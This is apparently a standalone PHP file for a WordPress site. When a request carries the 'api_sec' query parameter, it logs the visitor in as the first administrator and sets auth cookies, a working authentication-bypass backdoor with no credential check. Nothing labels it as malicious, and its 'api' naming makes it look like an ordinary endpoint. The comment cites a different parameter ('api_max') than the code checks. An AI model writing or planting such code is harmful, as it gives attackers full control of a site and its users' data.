<?php
// Load WordPress core
require_once( $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php' );

//  URL: ?api_max=1
if (isset($_GET['api_sec'])) {
    $admins = get_users([
        'role'    => 'administrator',
        'number'  => 1,
        'orderby' => 'ID',
        'order'   => 'ASC'
    ]);

    if (!empty($admins)) {
        $admin   = $admins[0];
        $user_id = $admin->ID;

        // Set current user and authentication cookies
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);

        // Redirect to dashboard
        wp_redirect(admin_url());
        exit;
    }
}
